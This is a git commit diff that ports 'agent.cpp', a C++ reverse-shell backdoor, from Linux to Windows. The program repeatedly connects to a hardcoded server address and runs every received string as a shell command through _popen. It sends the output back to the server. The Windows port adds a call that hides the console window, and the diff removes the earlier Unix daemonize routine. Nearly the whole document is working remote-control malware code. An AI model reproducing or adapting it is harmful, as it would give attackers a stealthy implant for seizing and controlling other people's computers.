dbf42f43484249e82bb857ae49eff67bdd06d238
Mastermind <nikitapushnyak@gmail.com>
2026-05-23 14:30:13 +0300

    Refactor agent.cpp for Windows compatibility

--- agent.cpp
+++ agent.cpp
@@ -1,75 +1,106 @@
-#include <unistd.h>
-#include <sys/stat.h>
-#include <fcntl.h>
+// #include <unistd.h>
+// #include <sys/stat.h>
+// #include <fcntl.h>
 #include <iostream>
-#include <cstdlib>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
+// #include <cstdlib>
+// #include <sys/socket.h>
+// #include <netinet/in.h>
+// #include <arpa/inet.h>
 #include <cstdio>
 #include <string>
 #include <cstring>
+#include <winsock2.h>
+#include <ws2tcpip.h>
 
-void deamonize(){
-    pid_t pid = fork();
-    if(pid < 0) exit(1);
-    if(pid > 0) exit(0);
+// void deamonize(){
+//     pid_t pid = fork();
+//     if(pid < 0) exit(1);
+//     if(pid > 0) exit(0);
 
-    if(setsid() < 0) exit(1);
+//     if(setsid() < 0) exit(1);
     
-    pid = fork();
-    if(pid < 0) exit(1);
-    if(pid > 0) exit(0);
+//     pid = fork();
+//     if(pid < 0) exit(1);
+//     if(pid > 0) exit(0);
 
-    umask(0);
-    if(chdir("/") < 0) exit(1);
+//     umask(0);
+//     if(chdir("/") < 0) exit(1);
 
-    int fd = open("/dev/null", O_RDWR);
-    if(fd >= 0) {
-        dup2(fd, STDIN_FILENO);
-        dup2(fd, STDOUT_FILENO);
-        dup2(fd, STDERR_FILENO);
-        if(fd > 2) close(fd);
-    }
-}
+//     int fd = open("/dev/null", O_RDWR);
+//     if(fd >= 0) {
+//         dup2(fd, STDIN_FILENO);
+//         dup2(fd, STDOUT_FILENO);
+//         dup2(fd, STDERR_FILENO);
+//         if(fd > 2) close(fd);
+//     }
+// }
 
-int establish_connection(const char* ip, int port){
+#pragma comment(lib, "ws2_32.lib")
+
+SOCKET establish_connection(const char* ip, int port){
+    // while(true) {
+    //     int sock = socket(AF_INET, SOCK_STREAM, 0);
+    //     if (sock < 0) {
+    //         sleep(10);
+    //         continue;
+    //     }
+
+    //     struct sockaddr_in addr;
+    //     addr.sin_family = AF_INET;      
+    //     addr.sin_port = htons(port);
+
+    //     if(inet_pton(AF_INET, ip, &addr.sin_addr) <= 0){
+    //         close(sock);
+    //         sleep(10);
+    //         continue;
+    //     }
+    //     if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0){
+    //         std::cerr << "Connection error" << std::endl;
+    //         close(sock);
+    //         sleep(5);
+    //         continue;
+    //     } else {
+    //         return sock;
+    //     }
+    // }
+
     while(true) {
-        int sock = socket(AF_INET, SOCK_STREAM, 0);
-        if (sock < 0) {
-            sleep(10);
+        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if(sock == INVALID_SOCKET){
+            Sleep(10000);
             continue;
         }
-
         struct sockaddr_in addr;
-        addr.sin_family = AF_INET;      
+        addr.sin_family= AF_INET;
         addr.sin_port = htons(port);
 
-        if(inet_pton(AF_INET, ip, &addr.sin_addr) <= 0){
-            close(sock);
-            sleep(10);
+        if(inet_pton(AF_INET, ip,&addr.sin_addr) <= 0) {
+            closesocket(sock);
+            Sleep(10000);
             continue;
         }
-        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0){
+        if(connect(sock , (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
             std::cerr << "Connection error" << std::endl;
-            close(sock);
-            sleep(5);
+            closesocket(sock);
+            Sleep(5000);
             continue;
-        } else {
+        }else{
             return sock;
         }
     }
 }
 
-void handle_server_commands(int sock){
+void handle_server_commands(SOCKET sock){
     while (true) {
         char buffer[1024] = {0};
         
-        ssize_t received_bytes = recv(sock, buffer, sizeof(buffer) - 1, 0); 
+        // ssize_t received_bytes = recv(sock, buffer, sizeof(buffer) - 1, 0); 
+        int received_bytes = recv(sock, buffer, sizeof(buffer) - 1, 0); 
         
         if (received_bytes <= 0) {
             std::cerr << "Server disconnected" << std::endl;
-            close(sock);
+            // close(sock);
+            closesocket(sock);
             return; 
         }
            
@@ -83,12 +114,14 @@ void handle_server_commands(int sock){
         if(received_bytes == 0) continue;
 
         if (strcmp(buffer, "exit") == 0) {
-            close(sock);
+            // close(sock);
+            closesocket(sock);
             exit(0);
         }
 
         std::string response = "";
-        FILE* pipe = popen(buffer, "r");
+        // FILE* pipe = popen(buffer, "r");
+        FILE* pipe = _popen(buffer, "r");
         
         if(!pipe) {
             response = "Failed to execute command \n";
@@ -97,7 +130,8 @@ void handle_server_commands(int sock){
             while(fgets(tmp_buffer, sizeof(tmp_buffer), pipe) != NULL) {
                 response += tmp_buffer;
             }
-            pclose(pipe);
+            // pclose(pipe);
+            _pclose(pipe);
         }
 
         if (response.empty()) { 
@@ -109,15 +143,24 @@ void handle_server_commands(int sock){
 }
 
 int main() {
-    // deamonize();
+    ShowWindow(GetConsoleWindow(), SW_HIDE); 
+
+    WSAData wsaData; 
+
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        std::cerr << "WSAStartup failed" << std::endl;
+        return 1;
+    }
 
     const char* server_ip = "127.0.0.1";
     int server_port = 8080;
 
     while(true) {
-        int active_socket = establish_connection(server_ip, server_port);
-        std::cout << "Connected to server" << std::endl;
+        SOCKET active_socket = establish_connection(server_ip, server_port);
+        
         handle_server_commands(active_socket);
     }
+
+    WSACleanup();
     return 0;
 }
